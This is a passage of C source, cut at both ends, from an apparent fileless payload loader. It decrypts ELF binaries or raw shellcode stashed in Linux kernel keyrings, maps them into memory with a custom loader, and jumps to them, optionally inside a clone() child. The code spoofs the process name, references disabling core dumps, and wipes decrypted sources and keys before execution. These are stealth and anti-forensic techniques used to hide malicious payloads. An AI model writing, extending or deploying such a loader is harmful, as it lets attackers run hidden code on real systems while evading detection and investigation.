            return seterr(err, "%s: PT_LOAD %u: file range out of bounds",
                          what, i);

        uint64_t vstart = page_down(base + p->p_vaddr);
        uint64_t vend   = page_up(base + p->p_vaddr + p->p_memsz);

        void *m = mmap((void *)vstart, (size_t)(vend - vstart),
                       PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED_NOREPLACE,
                       -1, 0);
        if (m == MAP_FAILED || (uint64_t)m != vstart)
            return seterr(err, "%s: mmap PT_LOAD %u at 0x%08" PRIx64
                          " failed: %s", what, i, vstart, strerror(errno));
        harden_anon(m, (size_t)(vend - vstart), 1, "PT_LOAD", KR_VMA_IMAGE);

        if (copy) {
            memcpy((void *)(base + p->p_vaddr), d + p->p_offset, p->p_filesz);
            if (p->p_memsz > p->p_filesz)
                /* BSS tail: MAP_ANONYMOUS pages are zero already; defensive */
                memset((void *)(base + p->p_vaddr + p->p_filesz), 0,
                       p->p_memsz - p->p_filesz);
        }
        /* copy==0: contents arrive later (streamed chunks); the
         * MAP_ANONYMOUS pages are zero, which is exactly the BSS
         * state the defensive memset above would produce */

        /*
         * W^X: segments are mapped RW first, then mprotect'ed to their
         * final protection. A W+X segment is left RWX — this loader is a
         * research tool.  In the deferred (copy==0) mode the final
         * protection is only RECORDED in ranges[] — the caller applies
         * it after the streamed fill.
         */
        int prot = 0;

        if (p->p_flags & PF_R) prot |= PROT_READ;
        if (p->p_flags & PF_W) prot |= PROT_WRITE;
        if (p->p_flags & PF_X) prot |= PROT_EXEC;
        if (copy &&
            mprotect((void *)vstart, (size_t)(vend - vstart), prot) == -1)
            return seterr(err, "%s: mprotect PT_LOAD %u -> %d failed: %s",
                          what, i, prot, strerror(errno));

        if (img->nranges >= KR_MAX_IMG_RANGES)
            return seterr(err, "%s: more than %d non-empty PT_LOAD segments",
                          what, KR_MAX_IMG_RANGES);
        img->ranges[img->nranges].start = vstart;
        img->ranges[img->nranges].end = vend;
        img->ranges[img->nranges].prot = (uint32_t)prot;
        img->nranges++;
    }
    return 0;
}

static int load_image(const uint8_t *d, size_t n, const char *what,
                      base_mode_t mode, uint64_t hint, image_t *img, char *err)
{
    const Elf64_Ehdr *eh;
    const Elf64_Phdr *ph;

    if (validate_elf(d, n, what, &eh, &ph, err) != 0)
        return -1;

    uint64_t lo = UINT64_MAX, hi = 0;

    memset(img, 0, sizeof *img);
    for (uint16_t i = 0; i < eh->e_phnum; i++) {
        const Elf64_Phdr *p = &ph[i];

        if (p->p_type == PT_LOAD) {
            if (p->p_memsz == 0)
                continue;
            if (p->p_vaddr < lo)
                lo = p->p_vaddr;
            if (p->p_vaddr + p->p_memsz > hi)
                hi = p->p_vaddr + p->p_memsz;
        } else if (p->p_type == PT_INTERP) {
            if (kr_oob(p->p_offset, p->p_filesz, n))
                return seterr(err, "%s: PT_INTERP out of bounds", what);
            if (!memchr(d + p->p_offset, '\0', p->p_filesz))
                return seterr(err, "%s: PT_INTERP path not NUL-terminated", what);
            img->has_interp = 1;
            img->interp_off = p->p_offset;
            img->interp_len = p->p_filesz;
        }
    }
    if (lo > hi)
        return seterr(err, "%s: no non-empty PT_LOAD segments", what);

    lo = page_down(lo);
    hi = page_up(hi);
    /*
     * Span cap: a hostile stash with extreme p_vaddr/p_memsz values can
     * ask for terabytes of address space; overcommit would grant it and
     * the resulting map/unmap churn is a memory-exhaustion DoS.  No
     * legitimate keyring stash payload comes near 1 GiB (stashes are
     * capped far below that by the keyring quotas themselves).
     * Found by test/fuzz_elf (a mutated phdr made the fuzzer map 90 GB
     * per iteration).
     */
    if (hi - lo > KR_MAX_IMG_SPAN)
        return seterr(err, "%s: PT_LOAD span %llu bytes exceeds the %d MiB "
                      "image-span limit", what,
                      (unsigned long long)(hi - lo),
                      (int)(KR_MAX_IMG_SPAN >> 20));
    img->span = hi - lo;

    switch (mode) {
    case BASE_FIXED_ZERO:
        img->base = 0;
        break;
    case BASE_PROBE: {
        void *probe = mmap(NULL, (size_t)(hi - lo), PROT_NONE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (probe == MAP_FAILED)
            return seterr(err, "%s: base probe mmap failed: %s",
                          what, strerror(errno));
        img->base = (uint64_t)probe - lo;
        munmap(probe, (size_t)(hi - lo));
        break;
    }
    case BASE_AT_HINT:
        img->base = page_up(hint) - lo;
        break;
    }

    if (map_pt_loads(d, n, eh, ph, img->base, what, img, 1, err) != 0)
        return -1;

    img->data  = d;
    img->len   = n;
    img->ehdr  = eh;
    img->phdr  = ph;
    img->entry = img->base + eh->e_entry;
    return 0;
}

/*
 * Wire-v4 streaming variant of load_image: `win` holds ONLY the
 * decrypted first pt-chunk of the plaintext (which must contain the ELF
 * header + program headers + any PT_INTERP path — true for every real
 * ELF); `flen` is the FULL plaintext length from the KRH4 header, used
 * for every file-range bounds check instead.  Every PT_LOAD is mapped
 * ZEROED RW with the final protection deferred (ranges[].prot), so the
 * caller can fill the image chunk by chunk and mprotect afterwards.
 */
static int load_image_stream(const uint8_t *win, size_t winlen, uint64_t flen,
                             const char *what, base_mode_t mode, uint64_t hint,
                             image_t *img, char *err)
{
    const Elf64_Ehdr *eh;
    const Elf64_Phdr *ph;
    uint64_t lo = UINT64_MAX, hi = 0;

    if (validate_elf(win, winlen, what, &eh, &ph, err) != 0)
        return -1;                       /* phdrs must be inside chunk 0 */
    if (flen > KR_MAX_IMG_SPAN)
        return seterr(err, "%s: plaintext length %llu exceeds the %d MiB "
                      "image-span limit", what,
                      (unsigned long long)flen,
                      (int)(KR_MAX_IMG_SPAN >> 20));

    memset(img, 0, sizeof *img);
    for (uint16_t i = 0; i < eh->e_phnum; i++) {
        const Elf64_Phdr *p = &ph[i];

        if (p->p_type == PT_LOAD) {
            if (p->p_memsz == 0)
                continue;
            if (p->p_vaddr < lo)
                lo = p->p_vaddr;
            if (p->p_vaddr + p->p_memsz > hi)
                hi = p->p_vaddr + p->p_memsz;
        } else if (p->p_type == PT_INTERP) {
            /*
             * the interpreter path string must live in the chunk-0
             * window — the only plaintext bytes mapped before the
             * streamed fill
             */
            if (kr_oob(p->p_offset, p->p_filesz, winlen))
                return seterr(err, "%s: PT_INTERP beyond the first v4 "
                              "pt-chunk (offset %llu, len %llu, window "
                              "%zu)", what,
                              (unsigned long long)p->p_offset,
                              (unsigned long long)p->p_filesz, winlen);
            if (!memchr(win + p->p_offset, '\0', p->p_filesz))
                return seterr(err, "%s: PT_INTERP path not NUL-terminated",
                              what);
            img->has_interp = 1;
            img->interp_off = p->p_offset;
            img->interp_len = p->p_filesz;
        }
    }
    if (lo > hi)
        return seterr(err, "%s: no non-empty PT_LOAD segments", what);

    lo = page_down(lo);
    hi = page_up(hi);
    if (hi - lo > KR_MAX_IMG_SPAN)
        return seterr(err, "%s: PT_LOAD span %llu bytes exceeds the %d MiB "
                      "image-span limit", what,
                      (unsigned long long)(hi - lo),
                      (int)(KR_MAX_IMG_SPAN >> 20));
    img->span = hi - lo;

    switch (mode) {
    case BASE_FIXED_ZERO:
        img->base = 0;
        break;
    case BASE_PROBE: {
        void *probe = mmap(NULL, (size_t)(hi - lo), PROT_NONE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        if (probe == MAP_FAILED)
            return seterr(err, "%s: base probe mmap failed: %s",
                          what, strerror(errno));
        img->base = (uint64_t)probe - lo;
        munmap(probe, (size_t)(hi - lo));
        break;
    }
    case BASE_AT_HINT:
        img->base = page_up(hint) - lo;
        break;
    }

    /* deferred mode: map zeroed, bounds checked against the full length */
    if (map_pt_loads(win, (size_t)flen, eh, ph, img->base, what, img, 0,
                     err) != 0)
        return -1;

    img->data  = win;
    img->len   = (size_t)flen;
    img->ehdr  = eh;
    img->phdr  = ph;
    img->entry = img->base + eh->e_entry;
    return 0;
}

/*
 * Scatter one decrypted pt-chunk — plaintext file bytes [off, off+n) —
 * into the mapped image. Every PT_LOAD maps [p_offset, p_offset+
 * p_filesz) to base + p_vaddr; file bytes covered by no PT_LOAD (e.g.
 * trailing section headers) belong to no segment and are simply not
 * copied anywhere (they are still covered by the whole-stash digest).
 * The image is RW at this point (deferred protections), and each copy
 * target is validated against the ranges map_pt_loads actually mapped.
 */
static int v4_scatter(const image_t *img, const uint8_t *pt, uint64_t off,
                      uint64_t n, char *err)
{
    const Elf64_Ehdr *eh = img->ehdr;

    for (uint16_t i = 0; i < eh->e_phnum; i++) {
        const Elf64_Phdr *p = &img->phdr[i];
        uint64_t lo, hi, dst, dlen;
        int ok = 0;

        if (p->p_type != PT_LOAD || p->p_filesz == 0 || p->p_memsz == 0)
            continue;
        lo = off > p->p_offset ? off : p->p_offset;
        hi = off + n < p->p_offset + p->p_filesz ? off + n
                                                 : p->p_offset + p->p_filesz;
        if (lo >= hi)
            continue;
        dst = img->base + p->p_vaddr + (lo - p->p_offset);
        dlen = hi - lo;
        for (int ri = 0; ri < img->nranges; ri++) {
            if (dst >= img->ranges[ri].start &&
                dst + dlen <= img->ranges[ri].end) {
                ok = 1;
                break;
            }
        }
        if (!ok)
            return seterr(err, "v4: PT_LOAD %u copy target 0x%08" PRIx64
                          "+%llu outside the mapped image", i, dst,
                          (unsigned long long)dlen);
        memcpy((void *)(uintptr_t)dst, pt + (size_t)(lo - off),
               (size_t)dlen);
    }
    return 0;
}

/* ---- Phase 3.4: locate the phdrs inside the mapped main image ---- */
static uint64_t phdr_addr_in_image(const image_t *img)
{
    const Elf64_Ehdr *eh = img->ehdr;
    uint64_t need_off = eh->e_phoff;
    uint64_t need_end = need_off + (uint64_t)eh->e_phnum * sizeof(Elf64_Phdr);

    for (uint16_t i = 0; i < eh->e_phnum; i++) {
        const Elf64_Phdr *p = &img->phdr[i];

        if (p->p_type != PT_LOAD || p->p_memsz == 0)
            continue;
        if (need_off >= (uint64_t)p->p_offset &&
            need_end <= (uint64_t)p->p_offset + p->p_filesz)
            return img->base + p->p_vaddr + (need_off - p->p_offset);
    }
    return 0;
}

/* ---- Phase 3.6: name spoofing ---- */
static void spoof_process_argv(const char *name)
{
    if (!g_pargv)
        return;
    size_t nl = strlen(name);

    for (int i = 0; i < g_pargc; i++) {
        char *a = g_pargv[i];

        if (!a)
            continue;
        size_t l = strlen(a);

        memset(a, 0, l);
        if (i == 0 && nl)
            memcpy(a, name, nl < l ? nl : l);
    }
}

/* ---- Phase 3.7: stack switch and jump (noreturn) ---- */
#ifdef __aarch64__
static void __attribute__((noreturn, noinline))
jump_to_entry(uint64_t entry, uint64_t sp)
{
    /*
     * AArch64 process start: the new sp arrives in x0, the entry in x1.
     * x0 is read into sp and THEN zeroed — at ELF entry on arm64, x0 is
     * the slot glibc's _start treats as the rtld_fini analog (ld.so
     * passes _dl_fini there; the kernel zeroes it for static starts),
     * so it must read as NULL, never as a stale stack value.
     */
    __asm__ volatile (
        "mov sp, %0\n\t"          /* switch to the built stack      */
        "mov x29, xzr\n\t"
        "mov x30, xzr\n\t"
        "mov x0, xzr\n\t"         /* rtld_fini slot -> NULL         */
        "br %1\n\t"
        :
        : "r"(sp), "r"(entry)
        /* x0/x29/x30 are zeroed inline: without the clobbers the compiler
         * may allocate %0/%1 into them and we'd branch to the zeroed reg */
        : "x0", "x29", "x30", "memory");
    __builtin_unreachable();
}
#else
static void __attribute__((noreturn, noinline))
jump_to_entry(uint64_t entry, uint64_t sp)
{
    __asm__ volatile (
        "movq %0, %%rsp\n\t"      /* switch to the built stack      */
        "xorq %%rbp, %%rbp\n\t"
        "xorq %%rbx, %%rbx\n\t"
        "xorq %%r12, %%r12\n\t"
        "xorq %%r13, %%r13\n\t"
        "xorq %%r14, %%r14\n\t"
        "xorq %%r15, %%r15\n\t"
        "xorq %%rdx, %%rdx\n\t"   /* rdx is read as rtld_fini       */
        "movq %1, %%rdi\n\t"
        "jmp *%%rdi\n\t"
        :
        : "r"(sp), "r"(entry)
        : "memory");
    __builtin_unreachable();
}
#endif

static char *push_str(char **cur, const char *s)
{
    size_t l = strlen(s) + 1;

    *cur -= (ptrdiff_t)l;
    memcpy(*cur, s, l);
    return *cur;
}

/*
 * Build the fresh SysV process-start stack (argc/argv/envp/auxv), spoof
 * the process name, and jump. Never returns on success; returns -1 with
 * err on failure to prepare.
 */
static int enter_process(uint64_t entry, const char *spoof,
                         char *const *argv, int argc, char *const *envp,
                         uint64_t at_phdr, uint64_t at_phent, uint64_t at_phnum,
                         uint64_t at_entry, uint64_t at_base,
                         const char *via, char *err)
{
    size_t envc = 0;

    while (envp && envp[envc])
        envc++;

    uint8_t *stk = mmap(NULL, STACK_SIZE, PROT_READ | PROT_WRITE,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
    if (stk == MAP_FAILED)
        return seterr(err, "stack mmap failed: %s", strerror(errno));
    harden_anon(stk, STACK_SIZE, 1, "payload stack", KR_VMA_STACK);

    char  *cur = (char *)stk + STACK_SIZE;
    size_t argc_new = argc >= 1 ? (size_t)argc : 1;

    char **astr = malloc(argc_new * sizeof(char *));
    char **estr = malloc((envc ? envc : 1) * sizeof(char *));
    if (!astr || !estr) {
        free(astr);
        free(estr);
        return seterr(err, "out of memory");
    }

    /* argv/envp strings, copied onto the new stack */
    astr[0] = push_str(&cur, spoof);
    for (size_t i = 1; i < argc_new; i++)
        astr[i] = push_str(&cur, argv[i] ? argv[i] : "");
    for (size_t i = 0; i < envc; i++)
        estr[i] = push_str(&cur, envp[i]);

    /* AT_PLATFORM string, AT_RANDOM bytes, AT_EXECFN string */
#ifdef __aarch64__
    const char *platform_str = "aarch64";
#else
    const char *platform_str = "x86_64";
#endif
    size_t platform_len = strlen(platform_str) + 1;

    cur -= (ptrdiff_t)platform_len;
    memcpy(cur, platform_str, platform_len);
    char *platform_ptr = cur;

    cur -= 16;
    if (kr_random(cur, 16) != 0)
        memset(cur, 0x5a, 16);      /* degraded but functional */
    char *random_ptr = cur;

    cur -= strlen(spoof) + 1;
    memcpy(cur, spoof, strlen(spoof) + 1);
    char *execfn_ptr = cur;

    size_t slots = 1 + (argc_new + 1) + (envc + 1) + 17 * 2;

    slots = (slots + 1) & ~(size_t)1;    /* even: final rsp 16-byte aligned */
    cur = (char *)((uintptr_t)cur & ~(uintptr_t)0xF);
    uint64_t *sp = (uint64_t *)cur - slots;

    if ((uint8_t *)sp - stk < 4096) {
        free(astr);
        free(estr);
        return seterr(err, "new stack layout overflow");
    }

    uint64_t *v = sp;

    *v++ = argc_new;
    for (size_t i = 0; i < argc_new; i++)
        *v++ = (uint64_t)astr[i];
    *v++ = 0;
    for (size_t i = 0; i < envc; i++)
        *v++ = (uint64_t)estr[i];
    *v++ = 0;

#define AUX1(t, val) do { *v++ = (uint64_t)(t); *v++ = (uint64_t)(val); } while (0)
    AUX1(AT_PHDR,         at_phdr);
    AUX1(AT_PHENT,        at_phent);
    AUX1(AT_PHNUM,        at_phnum);
    AUX1(AT_PAGESZ,       page_size());
    AUX1(AT_ENTRY,        at_entry);
    AUX1(AT_BASE,         at_base);
    AUX1(AT_RANDOM,       random_ptr);
    AUX1(AT_EXECFN,       execfn_ptr);
    AUX1(AT_UID,          getuid());
    AUX1(AT_EUID,         geteuid());
    AUX1(AT_GID,          getgid());
    AUX1(AT_EGID,         getegid());
    AUX1(AT_SECURE,       0);
#ifdef __aarch64__
    /*
     * /proc/self/auxv is unreliable here: under qemu-user it belongs to
     * the emulator process (host arch entries). getauxval() reads the
     * guest auxv from the initial stack instead; AT_SYSINFO_EHDR is
     * left 0 — an arm64 payload must use its own vdso, and importing a
     * foreign one (or the emulator's) would be worse than none.
     */
    AUX1(AT_HWCAP,        getauxval(AT_HWCAP));
    AUX1(AT_PLATFORM,     platform_ptr);
    AUX1(AT_SYSINFO_EHDR, 0);
#else
    AUX1(AT_HWCAP,        auxv_get(AT_HWCAP));
    AUX1(AT_PLATFORM,     platform_ptr);
    AUX1(AT_SYSINFO_EHDR, auxv_get(AT_SYSINFO_EHDR));
#endif
    AUX1(AT_NULL,         0);
#undef AUX1

    free(astr);
    free(estr);

    kr_logf("exec: jumping to entry 0x%08" PRIx64 " (%s), base=0x%08" PRIx64
            ", as \"%s\"", entry, via, at_base, spoof);

    /* name spoof + PR_SET_DUMPABLE(0) already applied by exec_hardening()
     * at the top of kr_exec_image / kr_call_symbol */
    /* wipes the memory `spoof` points into; nothing reads `spoof` after */
    spoof_process_argv(spoof);

    /*
     * Guard: every chunk key was already revoked by kr_load_revoke()
     * before this is reached, so the jump can only happen after the
     * revokes completed.
     */
    jump_to_entry(entry, (uint64_t)sp);
}

/* ===================================================================== */
/* --clone / agent: run the staged payload in a clone() child             */
/* ===================================================================== */

/*
 * Everything the clone child needs to enter the payload. Lives on the
 * shared heap/stack (CLONE_VM — the child sees the parent's memory).
 */
typedef struct {
    uint64_t    entry, at_phdr, at_phent, at_phnum, at_base, at_exec_entry;
    const char *spoof;
    char *const *argv;
    int         argc;
    char *const *envp;
    const char *via;
    char       *err;            /* shared err[] buffer for child failures */
} kr_clone_stage_t;

/*
 * Child side of --clone/agent: runs on the small scratch stack clone()
 * was given, immediately switches the payload onto a FRESH per-child
 * mmap'd stack created inside enter_process(), and never returns on
 * success — the payload terminates itself via its own exit_group.
 * Only _exit-style termination is legal here: with CLONE_VM the child
 * shares libc state with the parent and must not unwind it.
 */
static int clone_child_enter(void *arg)
{
    kr_clone_stage_t *st = arg;

    if (enter_process(st->entry, st->spoof, st->argv, st->argc, st->envp,
                      st->at_phdr, st->at_phent, st->at_phnum,
                      st->at_exec_entry, st->at_base, st->via, st->err) != 0)
        _exit(126);               /* staging failed inside the child */
    _exit(127);                   /* not reached */
}

/*
 * clone() a child that enters the staged payload, waitpid() it and
 * return its exit status (128+signal when killed). The child inherits
 * every fd (CLONE_FILES) — payloads that read stdin therefore consume
 * the caller's stdin; the agent passes a dedicated --ctlfd for exactly
 * this reason. One-shot: no execve anywhere, the child's exit_group is
 * the only terminal event. MADV_WIPEONFORK never fires on this path
 * (CLONE_VM shares mappings instead of copying them, so wipes are
 * irrelevant); the payload stack is per-child anyway.
 */
static int run_in_clone_child(kr_clone_stage_t *st, long *pid_out,
                              char *err)
{
    uint8_t *cstk = mmap(NULL, CLONE_STACK, PROT_READ | PROT_WRITE,
                         MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);

    if (cstk == MAP_FAILED)
        return seterr(err, "clone: child stack mmap failed: %s",
                      strerror(errno));
    harden_anon(cstk, CLONE_STACK, 0, "clone scratch stack", KR_VMA_SCRATCH);

    errno = 0;
    long pid = clone(clone_child_enter, cstk + CLONE_STACK,
                     CLONE_VM | CLONE_FS | CLONE_FILES | CLONE_SIGHAND |
                     SIGCHLD, st);

    if (pid == -1) {
        int e = errno;

        munmap(cstk, CLONE_STACK);
        return seterr(err, "clone: %s", strerror(e ? e : EINVAL));
    }
    kr_logf("clone: staged payload handed to child pid %ld", pid);
    if (pid_out)
        *pid_out = pid;

    int status = 0;

    while (waitpid((pid_t)pid, &status, 0) == -1) {
        if (errno == EINTR)
            continue;
        int e = errno;

        munmap(cstk, CLONE_STACK);
        return seterr(err, "clone: waitpid(%ld): %s", pid, strerror(e));
    }
    munmap(cstk, CLONE_STACK);

    if (WIFSIGNALED(status)) {
        kr_logf("clone: child pid %ld killed by signal %d", pid,
                WTERMSIG(status));
        return 128 + WTERMSIG(status);
    }
    if (WIFEXITED(status)) {
        int code = WEXITSTATUS(status);

        if (code == 126)
            kr_logf("clone: child staging failed: %s", st->err);
        return code;
    }
    return 127;
}

/*
 * Shared exec tail (v3/v2/legacy AND wire-v4 streaming): interpreter
 * (disk path, or --selfcontained reassembly from keys), AT_PHDR, the
 * source wipe, then --clone or the process jump.
 *
 * hdrwin points at a plaintext buffer holding the ELF header + phdrs:
 * the FULL image on the pre-v4 paths, or just chunk 0's window on the
 * v4 streaming path — it must stay live until the interpreter is loaded
 * and AT_PHDR is computed. wipe/wipelen is the plaintext-ish source to
 * zeroize right before the jump (NULL = none; the v4 wire is wiped by
 * exec_v4_stream itself once the last chunk is consumed).
 */
static int stage_and_enter(image_t *main, const uint8_t *hdrwin,
                           const kr_opts *o, int argc, char **argv,
                           char **envp, uint8_t *wipe, size_t wipelen,
                           char *err)
{
    uint64_t entry, at_phdr = 0, at_phent = 0, at_phnum = 0, at_base = 0;
    const char *via;
    int want_clone = o && o->clone_child;
    int have_interp = 0;
    image_t interp_img;
    const Elf64_Ehdr *eh = main->ehdr;

    /* ---- Phase 3.3: interpreter, if any ----
     * Default (wire <= v2.1 behavior): the interpreter is loaded from
     * disk — same as the kernel does; only the payload itself is
     * fileless. With --selfcontained (wire v2.2) the interpreter is
     * instead reassembled from the "<prefix>.ldso.*" chunk keys stored
     * at stash time: same user-then-persistent ring fallback and
     * ENOKEY-terminates loop as payload chunks, KRH1 digest verified on
     * load (the interpreter itself is ALWAYS stashed plaintext — it is
     * a public artifact, so sealing it has no signature value). */
    if (main->has_interp) {
        const char *ipath = (const char *)hdrwin + main->interp_off;
        uint8_t *ibuf;
        size_t ilen;

        if (o && o->selfcontained) {
            const char *prefix = o->desc_prefix ? o->desc_prefix
                                                : KR_DEFAULT_DESC;
            char ldesc[DESC_MAX];

            snprintf(ldesc, sizeof ldesc, "%s%s", prefix, KR_LDSO_SUFFIX);
            kr_logf("exec: --selfcontained: reassembling interpreter from "
                    "%s.* keys", ldesc);
            if (load_chunk_sequence(ldesc, NULL, 0, o && o->scrub,
                                    &ibuf, &ilen, err) != 0)
                return -1;      /* err already carries the load diagnostic */
            /*
             * Always open the interpreter wire without the key: it was
             * stored plaintext by design; wire_open still validates the
             * KRH1 header and verifies the SHA-256 digest.
             */
            uint8_t *ibytes = NULL;
            size_t ibytes_len = 0;

            if (wire_open(NULL, ibuf, ilen, &ibytes, &ibytes_len, err) != 0)
                return -1;
            ibuf = ibytes;
            ilen = ibytes_len;
            if (load_image(ibuf, ilen, "selfcontained interpreter",
                           BASE_AT_HINT,
                           main->base + main->span + INTERP_GAP,
                           &interp_img, err) != 0) {
                volatile_wipe(ibuf, ilen);
                free(ibuf);
                return -1;
            }
        } else {
            void *raw = NULL;

            if (kr_read_file(ipath, &raw, &ilen, err) != 0)
                return -1;
            ibuf = raw;
            if (load_image(ibuf, ilen, ipath, BASE_AT_HINT,
                           main->base + main->span + INTERP_GAP,
                           &interp_img, err) != 0) {
                volatile_wipe(ibuf, ilen);
                free(ibuf);
                return -1;
            }
        }
        have_interp = 1;
        /* the interpreter is fully mapped; drop the source copy */
        volatile_wipe(ibuf, ilen);
        free(ibuf);
    }

    entry = have_interp ? interp_img.entry : main->entry;
    at_base = have_interp ? interp_img.base : 0;
    via = have_interp ? "via interpreter" : "direct";

    /* ---- Phase 3.4: AT_PHDR ---- */
    at_phdr = phdr_addr_in_image(main);

    if (!at_phdr) {
        size_t phsz = (size_t)eh->e_phnum * sizeof(Elf64_Phdr);
        void *scratch = mmap(NULL, page_size(), PROT_READ | PROT_WRITE,
                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

        if (scratch == MAP_FAILED)
            return seterr(err, "phdr scratch mmap failed: %s", strerror(errno));
        harden_anon(scratch, page_size(), 0, "phdr scratch", KR_VMA_SCRATCH);
        memcpy(scratch, main->phdr, phsz);
        at_phdr = (uint64_t)scratch;
    }
    at_phent = eh->e_phentsize;
    at_phnum = eh->e_phnum;

    /*
     * Zeroize the plaintext-ish source immediately before the jump: on
     * the pre-v4 paths every PT_LOAD was copied into the mapped image
     * (and the phdr copy is in place), so the mapped executable image
     * is now the ONLY live copy of the payload — on the v4 streaming
     * path the same argument applies to the chunk-0 scratch window.
     * Under --clone the wipe happens BEFORE the child is created, and
     * because CLONE_VM shares (never copies) the address space, the
     * child starts with exactly the staged image and nothing else.
     */
    if (wipe)
        volatile_wipe(wipe, wipelen);

    if (want_clone) {
        kr_clone_stage_t st = {
            entry, at_phdr, at_phent, at_phnum, at_base, main->entry,
            argv[0], argv, argc, envp, via, err
        };
        return run_in_clone_child(&st, o ? o->child_pid_out : NULL, err);
    }
    return enter_process(entry, argv[0], argv, argc, envp,
                         at_phdr, at_phent, at_phnum, main->entry, at_base,
                         via, err);
}

/*
 * ---- Wire v4 (experimental): STREAMING exec ----
 *
 * The second defining v4 property. Receives the ENCRYPTED KRH4 wire
 * (the reassembled keyring ciphertext — unavoidable, and the only
 * stash-sized buffer that ever exists) and executes the payload withOUT
 * ever building a full plaintext buffer:
 *
 *   1. validate the KRH4 header (length equation, flags, digest, id);
 *   2. ONE bounded scratch of KR_V4_AAD_LEN + max-ptlen bytes (max
 *      ptlen = min(KR_V4_PT_CHUNK, plaintext length) — chunk-sized,
 *      never stash-sized: grep-verifiable, and asserted live by suite
 *      section 34 via the "v4: streamed ..." log line);
 *   3. decrypt chunk 0 into the scratch, validate_elf on that window,
 *      and map the image with load_image_stream() — every PT_LOAD
 *      ZEROED RW, final protections deferred;
 *   4. for every chunk i in order: AEAD-open chunk i into the scratch,
 *      feed it to the running SHA-256 (the whole-stash digest is
 *      verified over the exact full-plaintext bytes, still BEFORE
 *      anything jumps), scatter its bytes into the mapped image via the
 *      PT_LOAD file-offset mapping, wipe the scratch;
 *   5. apply the deferred final protections, wipe the wire (hygiene —
 *      it is ciphertext) and hand off to the shared exec tail.
 *
 * --raw streams into one RWX region the same way. --selfcontained
 * stashes never reach here: they are written as v3 at stash time
 * (auto-downgrade; explicit KR_WIRE=4 refuses) and foreign v4
 * selfcontained stashes are refused in kr_exec_image; the interpreter,
 * when present, comes from disk exactly as in v3.
 */
static int exec_v4_stream(const kr_opts *o, uint8_t *wire, size_t wirelen,
                          int argc, char **argv, char **envp, char *err)
{
    uint64_t ptlen = 0;
    uint32_t total = 0, max_pl;
    uint8_t key[32];
    uint8_t *scratch = NULL;
    size_t scratch_sz;
    int rc = -1;

    if (v4_parse_header(wire, wirelen, 1, &ptlen, &total, err) != 0)
        goto out_wire;
    if (!o || !o->key_hex) {
        seterr(err, "exec: v4 stash is per-chunk KR4-sealed; pass the same "
              "key (--key HEX or $KEYRINGER_KEY)");
        goto out_wire;
    }
    if (hex32(o->key_hex, key, err) != 0)
        goto out_wire;

    max_pl = ptlen < (uint64_t)KR_V4_PT_CHUNK ? (uint32_t)ptlen
                                              : KR_V4_PT_CHUNK;
    scratch_sz = (size_t)KR_V4_AAD_LEN + max_pl;
    scratch = malloc(scratch_sz);
    if (!scratch) {
        seterr(err, "out of memory");
        goto out_wire;
    }
    /* heap scratch: wiped after every chunk and before free (the page-
     * aligned madvise/VMA naming of harden_anon() does not apply to
     * malloc'd memory) */

    kr_logf("exec: v4 streaming assembly%s (per-chunk AEAD into the mapped "
            "image; scratch capped at one pt-chunk)",
            o->stream ? " requested" : " automatic (v4 implies streaming)");

    if (o->raw) {
        /* raw shellcode: one RWX region, streamed chunk by chunk */
        size_t rlen = (size_t)page_up(ptlen);
        void *region = mmap(NULL, rlen, PROT_READ | PROT_WRITE | PROT_EXEC,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
        kr_sha256_ctx hc;
        uint8_t calc[32];
        int failed = 0;

        if (region == MAP_FAILED) {
            seterr(err, "exec: raw region mmap failed: %s", strerror(errno));
            goto out_scratch;
        }
        harden_anon(region, rlen, 1, "raw shellcode region", KR_VMA_IMAGE);
        kr_sha256_init(&hc);
        for (uint32_t i = 0; i < total && !failed; i++) {
            uint32_t pl = 0;

            if (v4_open_chunk(key, wire, i, total, ptlen, scratch, &pl,
                              err) != 0) {
                failed = 1;
                break;
            }
            kr_sha256_update(&hc, scratch + KR_V4_AAD_LEN, pl);
            memcpy((uint8_t *)region + (size_t)i * KR_V4_PT_CHUNK,
                   scratch + KR_V4_AAD_LEN, pl);
            volatile_wipe(scratch, KR_V4_AAD_LEN + pl);
        }
        if (!failed) {
            kr_sha256_final(&hc, calc);
            if (memcmp(calc, wire + 8, 32) != 0) {
                seterr(err, "load: integrity digest MISMATCH — stash is "
                      "corrupt or was modified after stash; refusing to "
                      "execute");
                failed = 1;
            }
        }
        if (failed) {
            munmap(region, rlen);
            goto out_scratch;
        }
        kr_logf("v4: streamed %u chunk(s), max scratch %zu bytes", total,
                scratch_sz);
        volatile_wipe(wire, wirelen);      /* ciphertext hygiene */
        {
            uint64_t entry = (uint64_t)region;
            kr_clone_stage_t st = { entry, 0, 0, 0, 0, entry,
                                    argv[0], argv, argc, envp,
                                    "raw shellcode (v4 streamed)", err };

            volatile_wipe(scratch, scratch_sz);
            free(scratch);
            scratch = NULL;
            volatile_wipe(key, sizeof key);
            free(wire);
            if (o->clone_child)
                return run_in_clone_child(&st, o->child_pid_out, err);
            return enter_process(entry, argv[0], argv, argc, envp,
                                 0, 0, 0, entry, 0,
                                 "raw shellcode (v4 streamed)", err);
        }
    }

    /* ELF payload: decrypt chunk 0, validate + map zeroed, then fill */
    {
        image_t main_img;
        const Elf64_Ehdr *eh;
        const Elf64_Phdr *ph_unused;
        uint32_t pl0 = 0;
        kr_sha256_ctx hc;
        uint8_t calc[32];
        int failed = 0;

        if (v4_open_chunk(key, wire, 0, total, ptlen, scratch, &pl0,
                          err) != 0)
            goto out_scratch;
        if (validate_elf(scratch + KR_V4_AAD_LEN, pl0, "payload",
                         &eh, &ph_unused, err) != 0)
            goto out_scratch;
        if (load_image_stream(scratch + KR_V4_AAD_LEN, pl0, ptlen, "payload",
                              eh->e_type == ET_EXEC ? BASE_FIXED_ZERO
                                                    : BASE_PROBE,
                              0, &main_img, err) != 0)
            goto out_scratch;

        kr_sha256_init(&hc);
        /* chunk 0 is already in the scratch: hash + scatter, then the rest */
        for (uint32_t i = 0; i < total && !failed; i++) {
            uint32_t pl = pl0;

            if (i > 0) {
                if (v4_open_chunk(key, wire, i, total, ptlen, scratch,
                                  &pl, err) != 0) {
